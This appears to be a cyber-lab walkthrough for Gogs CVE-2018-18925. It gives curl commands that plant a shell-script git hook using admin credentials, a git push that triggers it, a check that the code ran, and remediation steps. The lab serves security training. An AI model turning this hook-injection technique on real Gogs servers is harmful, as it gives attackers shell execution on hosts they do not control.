# Gogs Git Hook Execution & Session File Directory Traversal RCE (CVE-2018-18925)

## Overview

Gogs is a self-hosted Git service written in Go. In versions prior to 0.11.66, authenticated users could manipulate session cookies containing path traversal sequences to load arbitrary session files from disk. When combined with Gogs custom git hooks (post-receive / update), an attacker can inject custom commands into repository hooks and trigger execution upon git push, obtaining host shell execution.

- **Service Access**: `http://localhost:8147/`
- **Default Credentials**: `admin:admin123 (or register new user)`
- **Docker Shortcut**: `./lab start gogs-hook-rce`
- **Container Name**: `cyberlab_industry_gogs_hook_rce`
- **RAM Footprint**: ~150M

---

## Exploitation Walkthrough

### 1. Access Gogs Web UI

```bash
curl -i http://localhost:8147/
```

### 2. Configure Git Hook on Created Repository

```bash
curl -i -u admin:admin123 -X POST 'http://localhost:8147/admin/repo/settings/hooks/git/post-receive' \
  -d 'content=%23%21%2Fbin%2Fsh%0Atouch+%2Ftmp%2Fpwned_gogs'
```

### 3. Trigger Git Push to Execute Hook

```bash
git push origin master
```

### 4. Verify Code Execution

```bash
docker exec -it cyberlab_industry_gogs_hook_rce ls -la /tmp/pwned_gogs
```

---

## Defensive Remediation & Hardening

1. Upgrade Gogs to version 0.11.66 or newer.
2. Disable ENABLE_CUSTOM_GIT_HOOKS in app.ini.
3. Enforce repository access controls and audit git hook definitions.

---

## Video Walkthroughs & Technical References

- [5 - File Upload (low/med/high) - Damn Vulnerable Web Application (DVWA)](https://www.youtube.com/watch?v=K7XBQWAZdZ4)
- [Gogs CVE-2018-18925 Advisory](https://github.com/gogs/gogs/issues/5469)
- [Vulhub Gogs Hook Environment](https://vulhub.org/#/environments/gogs/CVE-2018-18925/)
